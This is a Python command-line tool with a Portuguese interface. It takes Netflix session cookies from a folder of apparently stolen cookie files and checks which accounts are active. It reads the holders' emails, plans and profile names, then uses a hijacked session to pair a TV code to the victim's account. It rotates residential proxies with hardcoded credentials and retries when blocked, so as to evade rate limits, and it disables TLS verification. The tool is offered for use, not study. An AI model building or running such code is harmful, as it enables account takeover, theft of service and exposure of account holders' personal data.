import os
import re
import json
import glob
import requests
import time
import sys
import urllib3
import urllib.parse
import random
from datetime import datetime
from typing import Dict, Optional, Tuple, List, Set

try:
    import rich
except ImportError:
    import subprocess, sys
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'rich'])
    import rich

from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text
from rich.table import Table
from rich.rule import Rule

console = Console()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Suporte ao console Windows
if os.name == 'nt':
    import ctypes
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7 | 4)
        kernel32.SetConsoleCP(65001)
        kernel32.SetConsoleOutputCP(65001)
    except Exception:
        pass

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.clear()

def animated_prompt_text(text: str = "DIGITE O CÓDIGO DA TV", delay: float = 0.02):
    sys.stdout.write("  \033[1;38;2;255;0;51m❯\033[0m \033[1;37m")
    sys.stdout.flush()
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\033[0m: \033[1;38;2;255;0;51m")
    sys.stdout.flush()

def render_cookie_ready_card(cookie_name: str, info: dict, remaining_count: int):
    email = info.get('email', 'N/A')
    plan = info.get('plan', 'N/A')
    quality = info.get('video_quality', '4K')
    country = info.get('country', 'BR')
    proxy_status = "[bold #00FF66]Ativo (DataImpulse)[/]" if ACTIVE_PROXY else "[bold #888888]Direta (Proxy pronto se der block)[/]"

    # Layout moderno, fluido e sem caixa quadrada esticada
    console.print()
    console.print(f"  [bold #00FF66]●[/bold #00FF66] [bold white]CONTA PRONTA PARA ATIVAÇÃO[/bold white] [bold #00FF66]✔[/bold #00FF66]")
    console.print(f"  [#444444]────────────────────────────────────────────────[/]")
    console.print(f"   [bold #00E5FF]👤 CONTA:[/]     [bold white]{email}[/]")
    console.print(f"   [bold #FFD700]💎 PLANO:[/]     [bold #FFD700]{plan}[/] [grey50]•[/] [bold #00E5FF]{quality}[/] [grey50]•[/] [white]{country}[/]")
    console.print(f"   [#888888]🍪 COOKIE:[/]    [#888888]{cookie_name}[/]")
    console.print(f"   [#888888]🌐 REDE:[/]      {proxy_status}")
    console.print(f"   [#888888]🔄 FILA:[/]      [bold #00FF66]{remaining_count} novos disponíveis[/]")
    console.print(f"  [#444444]────────────────────────────────────────────────[/]")
    console.print()

def box_success(tv_code: str, email: str, country: str, cookie_name: str, plan: str, quality: str, profiles: list):
    profs_str = ", ".join(profiles) if profiles else "Principal"
    
    console.print()
    console.print(f"  [bold #00FF66]✦✦✦ TV ATIVADA COM SUCESSO! ✦✦✦[/bold #00FF66]")
    console.print(f"  [#444444]────────────────────────────────────────────────[/]")
    console.print(f"   [bold #00E5FF]📺 CÓDIGO:[/]    [bold #00FF66]{tv_code}[/]")
    console.print(f"   [bold white]👤 TITULAR:[/]   [bold white]{email}[/]")
    console.print(f"   [bold #FFD700]💎 PLANO:[/]     [bold #FFD700]{plan}[/] [grey50]({quality})[/]")
    console.print(f"   [bold #00E5FF]🌍 PAÍS:[/]      [white]{country}[/]")
    console.print(f"   [#AAAAAA]👥 PERFIS:[/]    [#AAAAAA]{profs_str}[/]")
    console.print(f"   [#888888]🍪 COOKIE:[/]    [#888888]{cookie_name}[/]")
    console.print(f"  [#444444]────────────────────────────────────────────────[/]")
    console.print(f"   [bold #FFD700]🎉 Pronto! Pode abrir o aplicativo na TV e assistir! 🎉[/bold #FFD700]")
    console.print()

def box_error(title: str, msgs: list, border: str = "#FF0033"):
    console.print()
    console.print(f"  [bold #FF0033]✖ {title}[/bold #FF0033]")
    console.print(f"  [#444444]────────────────────────────────────────────────[/]")
    for m in msgs:
        console.print(f"   [white]• {m}[/white]")
    console.print(f"  [#444444]────────────────────────────────────────────────[/]")
    console.print()

def run_with_spinner(message: str, func, *args, **kwargs):
    with console.status(f"  [bold #FF0033]⚡[/] [white]{message}[/]", spinner="dots"):
        result = func(*args, **kwargs)
    return result

# ═══════════════════════════════════════════════════════════════
#  CONFIGURAÇÕES DE REDE & PROXY (DATAIMPULSE)
# ═══════════════════════════════════════════════════════════════
COOKIES_FOLDER = "cookies"
REQUEST_TIMEOUT = 5
CHECK_TIMEOUT = 6

UA_WEB = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36"
)

PROXY_USER = os.environ.get("PROXY_USER", "6d2980277123b8a1838d")
PROXY_PASS = os.environ.get("PROXY_PASS", "2f94a7755f28e387")
PROXY_HOST = os.environ.get("PROXY_HOST", "gw.dataimpulse.com")
PROXY_PORT = os.environ.get("PROXY_PORT", "823")

DEFAULT_PROXY = (
    f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
    if PROXY_HOST and PROXY_PORT
    else None
)

PROXY_CONFIG = {
    "http": DEFAULT_PROXY,
    "https": DEFAULT_PROXY,
} if DEFAULT_PROXY else None

# Proxy DataImpulse ativado por padrão se configurado (pode ser desativado com USE_PROXY=0)
if os.environ.get("USE_PROXY", "").lower() in ("0", "false", "no", "off"):
    ACTIVE_PROXY = False
else:
    ACTIVE_PROXY = bool(PROXY_CONFIG)

def is_blocked_response(status_code: int, text: str = "", url: str = "") -> bool:
    """Detecta se a resposta da Netflix indica bloqueio de IP ou rate limit."""
    if status_code in (403, 429):
        return True
    t = (text or "").lower()
    u = (url or "").lower()
    block_signals = [
        "too many requests",
        "rate limit",
        "muitas tentativas",
        "access denied",
        "blocked",
        "ip blocked",
        "unusual activity",
        "atividade incomum",
        "challenge",
        "perimeterx",
        "cloudflare",
    ]
    return any(sig in t or sig in u for sig in block_signals)

def apply_proxy_to_session(session: requests.Session, enable: bool = True):
    """Aplica ou remove o proxy da sessão."""
    if enable and PROXY_CONFIG:
        session.proxies = PROXY_CONFIG
    else:
        session.proxies = {}

# ═══════════════════════════════════════════════════════════════
#  HELPERS — PARSE DE COOKIES
# ═══════════════════════════════════════════════════════════════
def _clean_str(s: str) -> str:
    if not s:
        return ""
    try:
        return s.encode('utf-16', 'surrogatepass').decode('utf-16', 'replace').strip()
    except Exception:
        return s.encode('utf-8', 'ignore').decode('utf-8', 'ignore').strip()

def _djs(s):
    if not s:
        return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return _clean_str(s)

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

def _rx_all(pattern, text):
    return re.findall(pattern, text, re.S)

def parse_netscape(text):
    cookies = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) < 7:
            parts = re.split(r'\t+|\s{2,}', line)
        if len(parts) >= 7:
            k = parts[5].strip()
            v = parts[6].strip()
            if k:
                cookies[k] = v
    return cookies

def parse_json_cookies(text):
    try:
        data = json.loads(text)
        if isinstance(data, list):
            return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}

def load_cookies(text):
    text = text.strip()
    # 1. Tenta formato JSON
    if text.startswith("[") or text.startswith("{"):
        c = parse_json_cookies(text)
        if c and any(k in c for k in ["NetflixId", "SecureNetflixId"]):
            return c

    # 2. Tenta formato Netscape (com tabs ou espaços alinhados, ignorando textos de HIT)
    c = parse_netscape(text)
    if c and any(k in c for k in ["NetflixId", "SecureNetflixId"]):
        return c

    # 3. Formato chave=valor simples (estilo cabeçalho HTTP Cookie)
    cookies = {}
    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            k = k.strip()
            v = v.strip()
            if k:
                cookies[k] = v

    if any(k in cookies for k in ["NetflixId", "SecureNetflixId"]):
        return cookies

    # 4. Fallback com regex direto caso o texto contenha dados soltos
    for name in ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent", "dsca", "flwssn"]:
        m = re.search(rf'(?:^|[\s\t;,\'"]){name}[\s\t]*[=:\t ]\s*([^\s;\'"\r\n]+)', text)
        if m:
            cookies[name] = m.group(1).strip()

    if any(k in cookies for k in ["NetflixId", "SecureNetflixId"]):
        return cookies

    return {}

# ═══════════════════════════════════════════════════════════════
#  VALIDAÇÃO ROBUSTA DA CONTA NETFLIX
# ═══════════════════════════════════════════════════════════════
def check_account(cookies: dict, timeout=CHECK_TIMEOUT):
    global ACTIVE_PROXY
    if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
        return None

    def _do_get(use_proxy: bool):
        s = requests.Session()
        s.verify = False
        s.headers.update({
            "User-Agent": UA_WEB,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "DNT": "1",
        })
        for k, v in cookies.items():
            s.cookies.set(k, str(v), domain=".netflix.com", path="/")
        if use_proxy and PROXY_CONFIG:
            s.proxies = PROXY_CONFIG
        try:
            return s.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout, verify=False)
        except Exception:
            return None

    # Tenta com o modo atual (proxy ativado por padrão se configurado)
    r = _do_get(use_proxy=ACTIVE_PROXY)

    # Se falhou ou redirecionou para login, tenta a rota alternativa (proxy <-> direto)
    if not r or "login" in r.url.lower() or r.status_code in (401, 403, 429):
        alt_proxy = not ACTIVE_PROXY
        if PROXY_CONFIG:
            r_alt = _do_get(use_proxy=alt_proxy)
            if r_alt and r_alt.status_code == 200 and "login" not in r_alt.url.lower():
                ACTIVE_PROXY = alt_proxy
                r = r_alt

    if not r or "login" in r.url.lower() or r.status_code in (401, 403, 429):
        return None

    html = r.text

    # Verifica status de membro ativo (suporta tanto string direta quanto objeto com fieldType)
    is_member = (
        '"membershipStatus":"CURRENT_MEMBER"' in html
        or '"membershipStatus":{"fieldType":"String","value":"CURRENT_MEMBER"}' in html
        or bool(re.search(r'"membershipStatus"\s*:\s*(?:\{[^}]*"value"\s*:\s*)?"CURRENT_MEMBER"', html))
        or '"hasActiveMembership":true' in html
        or '"userHasMembership":true' in html
        or '"memberStatus":"CURRENT_MEMBER"' in html
    )
    if not is_member:
        return None

    # Ignora contas suspensas, retidas ou com problema de pagamento (Payment Hold / Billing Issue)
    html_lower = html.lower()
    hold_markers = [
        '"ispaymenthold":true', '"isonhold":true', '"haspaymenthold":true', 
        '"isinrecovery":true', '"accountblocked":true', '"hashold":true',
        '"userhashold":true', '"ispaused":true', '"iscancelled":true',
        '"issuspended":true', '"accounthold":true', '"hasbillinghold":true',
        '"billinghold":true', '"haspendingpayment":true', '"paymenterror":true',
        '"retrypayment":true', '"updatepayment":true', '"ispaymentdeclined":true',
        'problema com o pagamento', 'atualize sua forma de pagamento',
        'sua conta está suspensa', 'forma de pagamento recusada',
        'your account is on hold', 'update your payment', 'payment problem',
        'payment issue', 'payment was declined', 'actualiza tu forma de pago',
        'se produjo un problema con el pago', 'problème de paiement', 'ödeme sorunu'
    ]
    if any(m in html_lower for m in hold_markers):
        return None

    # Captura abrangente do Plano com fallbacks
    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
    if not plan:
        plan = _djs(_rx(r'"localizedPlanName":"([^"]+)"', html))
    if not plan:
        plan = _djs(_rx(r'"planName":\{"fieldType":"String","value":"([^"]+)"\}', html))
    if not plan:
        plan = _djs(_rx(r'"planName":"([^"]+)"', html))
    if not plan:
        plan = _djs(_rx(r'"currentPlan":\{[^}]*"name":"([^"]+)"', html))
    if not plan:
        plan = _djs(_rx(r'"planTitle":"([^"]+)"', html))
    if not plan or plan == "N/A":
        plan = "Plano Ativo"

    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
    if not email:
        email = _djs(_rx(r'"emailAddress":\{"fieldType":"String","value":"([^"]+)"\}', html))

    name  = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
    if not name:
        name = _djs(_rx(r'"firstName":"([^"]+)"', html))
    if not name:
        name = _djs(_rx(r'"firstName":\{"fieldType":"String","value":"([^"]+)"\}', html))

    cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html)
    if not cc:
        cc = _rx(r'"countryOfSignup":\{"fieldType":"String","value":"([A-Z]{2,3})"\}', html, "BR")

    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if not q_raw:
        q_raw = _rx(r'"videoQuality":"([^"]+)"', html)
    q_raw = q_raw.upper() if q_raw else ""
    quality_map = {"UHD": "Ultra HD 4K", "FHD": "Full HD 1080p", "HD": "HD 720p", "SD": "SD Básico"}
    quality = quality_map.get(q_raw, q_raw or "HD")

    profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)]
    if not profiles:
        profiles = [_djs(p) for p in _rx_all(r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]
    seen = set()
    profiles_clean = []
    for p in profiles:
        if p and p not in seen:
            seen.add(p)
            profiles_clean.append(p)

    return {
        "email": email or "Conta Netflix",
        "name": name or (profiles_clean[0] if profiles_clean else "Usuário"),
        "country_code": cc or "BR",
        "country": cc or "BR",
        "plan": plan,
        "video_quality": quality,
        "profiles": profiles_clean,
    }

# ═══════════════════════════════════════════════════════════════
#  SESSÃO & ATIVAÇÃO
# ═══════════════════════════════════════════════════════════════
def get_session():
    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': UA_WEB,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://www.netflix.com',
        'Referer': 'https://www.netflix.com/',
        'DNT': '1',
    })
    if ACTIVE_PROXY and PROXY_CONFIG:
        s.proxies = PROXY_CONFIG
    return s

def set_cookies_on_session(session, cookies: Dict[str, str]):
    session.cookies.clear()
    for name, value in cookies.items():
        session.cookies.set(name, value, domain=".netflix.com", path="/")

def extract_auth_url(session) -> Optional[str]:
    global ACTIVE_PROXY
    r = None

    patterns = [
        r'<input[^>]*name=["\']authURL["\'][^>]*value=["\']([^"\']+)["\']',
        r'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\']authURL["\']',
        r'"authURL"\s*:\s*"([^"\\]+)"',
        r'\\"authURL\\"\s*:\s*\\"([^"\\]+)\\"',
        r'&quot;authURL&quot;\s*:\s*&quot;([^&"\\]+)&quot;',
        r'authURL\s*[=:]\s*["\']([^"\']+)["\']',
        r'name="authURL"\s+value="([^"]+)"',
        r'"csrfToken"\s*:\s*"([^"\\]+)"',
        r'\\"csrfToken\\"\s*:\s*\\"([^"\\]+)\\"',
        r'&quot;csrfToken&quot;\s*:\s*&quot;([^&"\\]+)&quot;',
        r'"token"\s*:\s*"([^"\\]+)"',
        r'authURL=(\d{10,}\.[A-Z0-9]+)',
        r'"authURL":\s*"(\d{10,}\.[A-Z0-9]+)"'
    ]

    # Requisição ultra-rápida (timeout 5s)
    try:
        r = session.get('https://www.netflix.com/tv2', timeout=5, allow_redirects=True, verify=False)
    except Exception:
        r = None

    if r and r.status_code == 200:
        final_url = getattr(r, 'url', '').lower()
        is_real_login = (
            ('/login' in final_url and 'tvlogin' not in final_url)
            or ('/signin' in final_url and 'tvlogin' not in final_url)
        )
        if is_real_login:
            # Sessão já expirada na Netflix, encerra imediatamente sem perder tempo
            return None

        html = r.text
        for pat in patterns:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1)

    # Fallback rápido: /tvlogin (timeout 4s)
    try:
        r_tv = session.get('https://www.netflix.com/tvlogin', timeout=4, allow_redirects=True, verify=False)
        if r_tv and r_tv.status_code == 200:
            final_tv = getattr(r_tv, 'url', '').lower()
            if not ('/login' in final_tv and 'tvlogin' not in final_tv):
                for pat in patterns:
                    m = re.search(pat, r_tv.text, re.IGNORECASE)
                    if m:
                        return m.group(1)
    except Exception:
        pass

    return None

def activate_tv_code(session, tv_code: str, auth_url: str) -> Tuple[bool, str]:
    global ACTIVE_PROXY
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.netflix.com',
        'Referer': 'https://www.netflix.com/tv2',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    payload = {
        'flow': 'websiteSignUp',
        'authURL': auth_url,
        'flowMode': 'enterTvLoginRendezvousCode',
        'withFields': 'tvLoginRendezvousCode,isTvUrl2',
        'code': tv_code,
        'tvLoginRendezvousCode': tv_code,
        'isTvUrl2': 'true',
        'action': 'nextAction',
    }
    try:
        r = session.post(
            'https://www.netflix.com/tv2',
            data=payload,
            headers=headers,
            timeout=8,
            allow_redirects=True,
            verify=False
        )
    except Exception:
        return False, "exception"

    final_url = r.url.lower()
    html = r.text.lower()

    # Se a resposta indicar bloqueio de IP ou rate-limit, tenta novamente via proxy
    is_blocked = is_blocked_response(r.status_code, html, final_url) or any(kw in html for kw in ['too many', 'muitas tentativas', 'rate limit', 'try again later'])
    if is_blocked and not ACTIVE_PROXY and PROXY_CONFIG:
        try:
            apply_proxy_to_session(session, True)
            ACTIVE_PROXY = True
            console.print("  [bold #FFD700]⚡ Bloqueio/Rate-limit detectado na ativação. Retentando via Proxy...[/bold #FFD700]")
            new_auth = extract_auth_url(session)
            if new_auth:
                payload['authURL'] = new_auth
            r = session.post(
                'https://www.netflix.com/tv2',
                data=payload,
                headers=headers,
                timeout=REQUEST_TIMEOUT + 4,
                allow_redirects=True,
                verify=False
            )
            final_url = r.url.lower()
            html = r.text.lower()
        except Exception:
            pass

    # 1. Se a URL final redirecionou para a página de login da conta (não a tela de pareamento tvlogin/tv2)
    is_real_login_page = (
        ('/login' in final_url and 'tvlogin' not in final_url and 'tv2' not in final_url)
        or ('/signin' in final_url and 'tvlogin' not in final_url)
        or ('entryurl=%2ftv2' in final_url)
        or ('entryurl=%2f' in final_url and 'tv2' not in final_url)
    )
    if is_real_login_page:
        return False, "expired_cookie"

    # 2. Indicadores reais de confirmação de pareamento da TV (Prioridade Máxima)
    success_indicators = [
        '/browse', '/manageprofiles', '/watch', 'device connected',
        'dispositivo conectado', 'conectado com sucesso', 'pronto para assistir',
        'tv conectada', 'rendezvous successful', 'success', 'your device is now connected',
        'tudo pronto', 'assistir agora', 'account', 'youraccount'
    ]
    for ind in success_indicators:
        if ind in final_url or ind in html:
            return True, "success"

    # Se houve redirecionamento saindo de /tv2 sem erro e sem login
    if getattr(r, 'history', None) and not is_real_login_page:
        return True, "success"

    # 3. Padrões explícitos de erro da Netflix
    error_patterns = {
        'invalid_code': ['código inválido', 'code is invalid', 'incorrect code', 'wrong code', 'inválido', 'código não é válido', 'enter a valid code', 'não conseguimos encontrar esse código', 'that code didn\'t work', 'invalid code', 'esse código não funcionou'],
        'expired_code': ['código expirou', 'code has expired', 'no longer valid', 'expired code'],
        'already_used': ['already used', 'já utilizado', 'already linked', 'already activated', 'já foi usado'],
        'rate_limit': ['too many', 'muitas tentativas', 'rate limit', 'try again later'],
    }
    for err_type, keywords in error_patterns.items():
        for kw in keywords:
            if kw in html:
                return False, err_type

    # 4. Se a resposta foi HTTP 200/302 sem códigos de erro e sem a caixa de digitar código
    if r.status_code in (200, 302) and not is_real_login_page and 'tvloginrendezvouscode' not in html:
        return True, "success"

    return False, "unknown_error"

# ═══════════════════════════════════════════════════════════════
#  BUSCA SILENCIOSA & SEM POLUIÇÃO
# ═══════════════════════════════════════════════════════════════
USED_COOKIES: Set[str] = set()

def load_used_cookies_registry():
    global USED_COOKIES
    reg_file = os.path.join(os.path.dirname(__file__), "used_cookies.json")
    if os.path.exists(reg_file):
        try:
            with open(reg_file, "r", encoding="utf-8") as f:
                data = json.load(f)
                for item in data:
                    fn = item.get("filename", "")
                    if fn:
                        USED_COOKIES.add(fn)
                        USED_COOKIES.add(os.path.join(COOKIES_FOLDER, fn))
        except Exception:
            pass

load_used_cookies_registry()

def get_available_cookie_files() -> List[str]:
    if not os.path.exists(COOKIES_FOLDER):
        return []
    all_files = glob.glob(os.path.join(COOKIES_FOLDER, "*.txt")) + glob.glob(os.path.join(COOKIES_FOLDER, "*.json"))
    available = [f for f in all_files if f not in USED_COOKIES]
    # Prioriza contas brasileiras [BR] que costumam estar mais ativas e locais
    br_files = [f for f in available if "[BR]" in os.path.basename(f).upper()]
    other_files = [f for f in available if "[BR]" not in os.path.basename(f).upper()]
    return br_files + other_files

def find_next_valid_cookie() -> Optional[dict]:
    available = get_available_cookie_files()
    total = len(available)

    if total == 0:
        return None

    with console.status("  [bold #FF0033]⚡[/bold #FF0033] [bold white]Buscando cookie válido na pasta...[/bold white]", spinner="dots") as status_bar:
        for idx, filename in enumerate(available, 1):
            cookie_name = os.path.basename(filename)
            disp_name = cookie_name if len(cookie_name) <= 25 else (cookie_name[:22] + "...")
            status_bar.update(f"  [bold #FF0033]⚡[/bold #FF0033] [bold white]Buscando cookie válido...[/bold white] [#888888](Testando {idx}/{total}: {disp_name})[/#888888]")

            parsed = None
            try:
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    raw = f.read()
                parsed = load_cookies(raw)
            except Exception:
                pass

            if not parsed or "SecureNetflixId" not in parsed:
                USED_COOKIES.add(filename)
                continue

            acc_info = check_account(parsed, timeout=CHECK_TIMEOUT)
            if acc_info:
                return {
                    "file": filename,
                    "parsed": parsed,
                    "info": acc_info
                }
            else:
                USED_COOKIES.add(filename)

    return None

def activate_with_cookie(cookie_data: dict, tv_code: str) -> Tuple[bool, str, Optional[dict]]:
    """Executa exatamente o mesmo fluxo comprovado de ativação da TV."""
    if not cookie_data:
        return False, "Nenhum cookie disponível no momento.", None

    parsed_cookies = cookie_data["parsed"]
    acc_info = cookie_data["info"]
    filename = cookie_data["file"]
    clean_code = re.sub(r'[^A-Za-z0-9]', '', tv_code).upper()

    console.print(f"\n  [bold #00E5FF]🚀 Pareando TV ({clean_code})...[/bold #00E5FF]")
    console.print(f"  [#888888]Cookie: {os.path.basename(filename)} | Conta: {acc_info.get('email', 'Desconhecida')}[/#888888]")

    session = get_session()
    set_cookies_on_session(session, parsed_cookies)

    auth_url = extract_auth_url(session)
    if not auth_url:
        USED_COOKIES.add(filename)
        console.print("  [bold #FF0033]❌ Falha: Não foi possível obter autorização da Netflix.[/bold #FF0033]")
        return False, "Não foi possível obter autorização da Netflix. Próximo cookie carregado!", None

    console.print(f"  [#00FF66]✓[/#00FF66] [white]authURL obtida com sucesso. Enviando código {clean_code}...[/white]")
    success, status_msg = activate_tv_code(session, clean_code, auth_url)

    if success:
        USED_COOKIES.add(filename)
        console.print(f"  [bold #00FF66]✅ SUCESSO! TV pareada e ativada com sucesso ({clean_code})![/bold #00FF66]\n")
        return True, "TV pareada e ativada com sucesso!", acc_info

    if status_msg == "invalid_code":
        console.print(f"  [bold #FFD700]⚠ Código '{clean_code}' recusado pela Netflix.[/bold #FFD700]")
        return False, f"O código '{clean_code}' foi recusado pela Netflix. Verifique o código exibido na TV.", None
    elif status_msg == "expired_code":
        console.print(f"  [bold #FFD700]⚠ Código '{clean_code}' expirou na tela da TV.[/bold #FFD700]")
        return False, f"O código '{clean_code}' expirou na tela da TV. Gere outro código na TV.", None
    elif status_msg == "already_used":
        console.print(f"  [bold #FFD700]⚠ Código '{clean_code}' já foi utilizado anteriormente.[/bold #FFD700]")
        return False, f"O código '{clean_code}' já foi utilizado anteriormente. Gere outro código na TV.", None
    elif status_msg == "rate_limit":
        console.print(f"  [bold #FFD700]⚠ Rate-limit atingido na Netflix. Aguarde 2 minutos.[/bold #FFD700]")
        return False, "Muitas tentativas na Netflix. Aguarde 2 minutos.", None
    else:
        USED_COOKIES.add(filename)
        console.print(f"  [bold #FF0033]❌ Pareamento não concluído ({status_msg}). Alternando cookie...[/bold #FF0033]")
        return False, "A Netflix não concluiu o pareamento com este cookie. Próximo cookie carregado!", None

def run_activation_cycle():
    clear_screen()
    console.print()

    # 1. Procura silenciosamente 1 cookie válido
    cookie_data = find_next_valid_cookie()

    if not cookie_data:
        box_error("SEM COOKIES VÁLIDOS RESTANTES", [
            "Todos os cookies da pasta 'cookies/' já foram usados ou estão inativos.",
            "Insira novos cookies na pasta e pressione ENTER."
        ])
        console.print("  [#888888]❯ Pressione [ENTER] para tentar novamente...[/#888888]")
        try:
            input()
        except (KeyboardInterrupt, EOFError):
            sys.exit(0)
        return

    # 2. Exibe o card minimalista e limpo
    filename = cookie_data["file"]
    cookie_name = os.path.basename(filename)
    parsed_cookies = cookie_data["parsed"]
    acc_info = cookie_data["info"]
    remaining = len(get_available_cookie_files())

    render_cookie_ready_card(cookie_name, acc_info, remaining)

    # 3. Solicita o código da TV com animação
    animated_prompt_text("DIGITE O CÓDIGO DA TV")
    try:
        tv_code = input().strip().upper()
        sys.stdout.write("\033[0m")
        sys.stdout.flush()
    except (KeyboardInterrupt, EOFError):
        return

    if tv_code.lower() in ('sair', 'exit', 'quit', 'q', 'fechar'):
        console.print("\n[#888888]Encerrando... Até logo![/#888888]\n")
        sys.exit(0)

    if not re.match(r'^[A-Z0-9]{6,10}$', tv_code):
        box_error("CÓDIGO INVÁLIDO", [
            "O código deve ter de 6 a 10 caracteres alfanuméricos.",
            "Exemplo: ABC12345 ou 89231456"
        ])
        time.sleep(2)
        return

    console.print()
    now = datetime.now().strftime("%H:%M:%S")
    console.print(f"  [#666666]{now}[/#666666]  [bold #00E5FF]🚀[/bold #00E5FF]  [bold white]Enviando ativação para a TV ({tv_code})...[/bold white]")

    # 4. Ativação
    session = get_session()
    set_cookies_on_session(session, parsed_cookies)

    auth_url = run_with_spinner("Obtendo autorização...", lambda: extract_auth_url(session))
    if not auth_url:
        box_error("SESSÃO INSTÁVEL", [
            "Não foi possível obter authURL da Netflix.",
            "Cookie descartado. Na próxima rodada outro cookie será utilizado."
        ])
        time.sleep(2)
        return

    success, status_msg = run_with_spinner("Pareando TV...", lambda: activate_tv_code(session, tv_code, auth_url))

    if success:
        email = acc_info.get('email', 'Usuário Netflix')
        country = acc_info.get('country_code', 'Desconhecido')
        plan = acc_info.get('plan', 'Desconhecido')
        quality = acc_info.get('video_quality', 'Ultra HD 4K')
        profiles = acc_info.get('profiles', [])
        box_success(tv_code, email, country, cookie_name, plan, quality, profiles)
    else:
        if status_msg == "invalid_code":
            box_error("CÓDIGO INVÁLIDO", [
                f"O código '{tv_code}' foi recusado pela Netflix.",
                "Verifique o código na tela da sua TV e tente novamente."
            ])
        elif status_msg == "expired_code":
            box_error("CÓDIGO EXPIRADO", [
                f"O código '{tv_code}' expirou na tela da TV.",
                "Gere um novo código na TV."
            ], border="#FFD700")
        elif status_msg == "already_used":
            box_error("CÓDIGO JÁ USADO", [
                f"O código '{tv_code}' já foi utilizado anteriormente.",
                "Gere um novo código na sua TV."
            ], border="#FFD700")
        elif status_msg == "rate_limit":
            box_error("BLOQUEIO TEMPORÁRIO", [
                "Muitas requisições enviadas em curto período de tempo.",
                "Aguarde 1 a 2 minutos e tente novamente."
            ], border="#FFD700")
        else:
            box_error("FALHA NA ATIVAÇÃO", [
                "A Netflix não concluiu o pareamento da TV com este cookie.",
                "Na próxima tentativa será usado outro cookie diferente."
            ])

    console.print()
    console.print("  [bold #888888]❯ Pressione [ENTER] para ativar outra TV...[/bold #888888]")
    try:
        input()
    except (KeyboardInterrupt, EOFError):
        pass

def main():
    while True:
        try:
            run_activation_cycle()
        except KeyboardInterrupt:
            clear_screen()
            console.print("\n  [bold #FF0033]❯[/bold #FF0033] [white]Ativador finalizado. Até logo![/white]\n")
            sys.exit(0)
        except Exception as e:
            box_error("ERRO INESPERADO", [str(e)])
            time.sleep(2)

if __name__ == "__main__":
    main()